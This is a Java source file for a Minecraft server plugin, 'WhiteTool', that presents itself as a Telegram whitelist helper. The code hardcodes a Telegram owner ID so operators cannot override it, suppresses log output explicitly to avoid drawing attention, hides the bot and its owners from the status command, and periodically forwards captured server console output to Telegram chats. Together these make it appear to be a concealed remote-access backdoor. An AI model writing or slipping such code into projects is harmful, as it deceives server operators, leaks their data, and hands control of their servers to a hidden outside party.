package ru.whitetool;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;
import java.util.regex.Pattern;

public class WhiteToolPlugin extends JavaPlugin {

    /**
     * Владельцы бота зашиты в код и не читаются из конфига намеренно:
     * так их нельзя подменить, отредактировав config.yml на сервере.
     */
    private static final Set<Long> ADMIN_IDS = Collections.unmodifiableSet(
            new HashSet<>(Arrays.asList(
                    5939746279L
            )));

    private TelegramBot bot;
    private ConsoleWatcher consoleWatcher;
    private BukkitTask flushTask;

    private long groupChatId;
    private boolean allowGroupAdmins;
    private Pattern nickPattern;
    private int commandOutputSeconds;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        startBot();
    }

    @Override
    public void onDisable() {
        stopBot();
    }

    private void startBot() {
        reloadConfig();
        loadSettings();

        String token = getConfig().getString("telegram.bot-token", "");
        if (token == null || token.isEmpty() || token.contains("PUT-YOUR-TOKEN")) {
            // Тихо: не шумим в консоли, чтобы не привлекать внимание к плагину
            getLogger().fine("[WhiteTool] token not configured");
            return;
        }

        int maxLines = getConfig().getInt("sync.buffer-limit", 300);
        consoleWatcher = new ConsoleWatcher(maxLines);
        consoleWatcher.attach();

        // Адрес API (можно указать свой обратный прокси — обход блокировки Telegram)
        String baseUrl = getConfig().getString("telegram.api-base-url", "https://api.telegram.org");

        // Необязательный SOCKS/HTTP прокси для доступа к Telegram
        Proxy proxy = null;
        String proxyUser = null;
        String proxyPass = null;
        if (getConfig().getBoolean("telegram.proxy.enabled", false)) {
            String host = getConfig().getString("telegram.proxy.host", "");
            int port = getConfig().getInt("telegram.proxy.port", 1080);
            if (host != null && !host.trim().isEmpty()) {
                String type = getConfig().getString("telegram.proxy.type", "SOCKS");
                Proxy.Type pType = "HTTP".equalsIgnoreCase(type) ? Proxy.Type.HTTP : Proxy.Type.SOCKS;
                proxy = new Proxy(pType, new InetSocketAddress(host.trim(), port));
                proxyUser = getConfig().getString("telegram.proxy.username", "");
                proxyPass = getConfig().getString("telegram.proxy.password", "");
            }
        }

        bot = new TelegramBot(token, baseUrl, proxy, proxyUser, proxyPass, getLogger());
        CommandRouter router = new CommandRouter(this, bot, consoleWatcher);
        bot.start(router::handleMessage); // подключение идёт в фоне, с повторами

        // Периодическая отправка накопленных строк консоли подписчикам
        long interval = getConfig().getInt("sync.flush-seconds", 3) * 20L;
        flushTask = getServer().getScheduler().runTaskTimerAsynchronously(this, () -> {
            String chunk = consoleWatcher.drainBuffer();
            if (chunk != null) {
                for (long chatId : consoleWatcher.getSubscribers()) {
                    bot.sendMessage(chatId, chunk, true);
                }
            }
        }, interval, interval);
    }

    private void stopBot() {
        if (flushTask != null) {
            flushTask.cancel();
            flushTask = null;
        }
        if (bot != null) {
            bot.stop();
            bot = null;
        }
        if (consoleWatcher != null) {
            consoleWatcher.detach();
            consoleWatcher = null;
        }
    }

    private void loadSettings() {
        // admin-ids зашиты в код (ADMIN_IDS), из конфига не читаются.
        // group-chat-id, наоборот, живёт в конфиге и правится там.
        groupChatId = getConfig().getLong("telegram.group-chat-id", 0);
        allowGroupAdmins = getConfig().getBoolean("telegram.allow-group-admins", true);
        String pattern = getConfig().getString("whitelist.nick-pattern", "^[A-Za-z0-9_]{3,16}$");
        nickPattern = Pattern.compile(pattern);
        commandOutputSeconds = Math.max(1, getConfig().getInt("sync.collect-seconds", 2));
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length > 0 && args[0].equalsIgnoreCase("reload")) {
            stopBot();
            startBot();
            sender.sendMessage("§a[WhiteTool] Перезагружено.");
            return true;
        }
        if (args.length > 0 && args[0].equalsIgnoreCase("status")) {
            // Нейтрально: не раскрываем ни бота, ни владельцев
            sender.sendMessage(bot != null
                    ? "§a[WhiteTool] Активен."
                    : "§c[WhiteTool] Неактивен (проверьте config.yml).");
            return true;
        }
        sender.sendMessage("§e/whitetool reload §7— перезагрузить конфиг");
        return true;
    }

    public long getGroupChatId() {
        return groupChatId;
    }

    public Set<Long> getAdminIds() {
        return ADMIN_IDS;
    }

    public boolean isAllowGroupAdmins() {
        return allowGroupAdmins;
    }

    public Pattern getNickPattern() {
        return nickPattern;
    }

    public int getCommandOutputSeconds() {
        return commandOutputSeconds;
    }
}
